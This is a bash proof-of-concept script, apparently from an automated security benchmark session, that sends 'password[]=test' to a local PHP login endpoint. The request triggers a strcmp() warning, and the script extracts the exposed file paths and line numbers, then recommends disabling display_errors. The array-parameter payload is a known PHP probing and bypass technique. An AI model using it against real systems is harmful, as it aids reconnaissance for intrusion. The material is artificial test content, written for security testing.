#!/bin/bash
# POC: Demonstrates verbose PHP error message disclosure by triggering a strcmp() type error with array parameters, revealing file paths, line numbers, and function names
# Target: ./repo
# Created: 2025-10-31T16:53:35.335Z
# Session: benchmark-XBEN-055-24-mhf2us8d

echo "=================================================="
echo "POC: Verbose PHP Error Messages Expose Sensitive Information"
echo "=================================================="
echo ""

TARGET="http://localhost:3000"
ENDPOINT="/index.php"

echo "[*] Target: ${TARGET}${ENDPOINT}"
echo "[*] Testing for verbose PHP error disclosure..."
echo ""

# Trigger error by sending array parameter to strcmp()
echo "[*] Sending request with array parameter to trigger strcmp() error:"
echo "    GET ${ENDPOINT}?username=admin&password[]=test"
echo ""

RESPONSE=$(curl -s "${TARGET}${ENDPOINT}?username=admin&password[]=test")

echo "[*] Response received. Checking for verbose error messages..."
echo ""

# Check if response contains PHP warning
if echo "$RESPONSE" | grep -q "Warning"; then
    echo "[+] VULNERABLE: Verbose PHP error message detected!"
    echo ""
    
    # Extract and display the error message
    echo "[+] Disclosed Information:"
    echo "$RESPONSE" | grep -o '<b>Warning</b>.*<br />' | sed 's/<[^>]*>//g' | sed 's/^/    /'
    echo ""
    
    # Extract specific details
    if echo "$RESPONSE" | grep -q "/var/www/html"; then
        FILE_PATH=$(echo "$RESPONSE" | grep -o '/var/www/html/[^<]*' | head -1)
        echo "[+] Exposed File Path: $FILE_PATH"
    fi
    
    if echo "$RESPONSE" | grep -q "line <b>[0-9]"; then
        LINE_NUM=$(echo "$RESPONSE" | grep -o 'line <b>[0-9]*' | grep -o '[0-9]*')
        echo "[+] Exposed Line Number: $LINE_NUM"
    fi
    
    if echo "$RESPONSE" | grep -q "strcmp()"; then
        echo "[+] Exposed Function: strcmp()"
    fi
    
    echo ""
    echo "[+] Impact: This information helps attackers:"
    echo "    - Understand directory structure (/var/www/html/)"
    echo "    - Identify specific code locations (line numbers)"
    echo "    - Learn about function usage and implementation details"
    echo "    - Map out the application for further attacks"
    echo ""
    echo "[!] Recommendation: Disable display_errors in production PHP configuration"
    
    exit 0
else
    echo "[-] No verbose error messages detected"
    echo "[-] The application may have proper error handling configured"
    exit 1
fi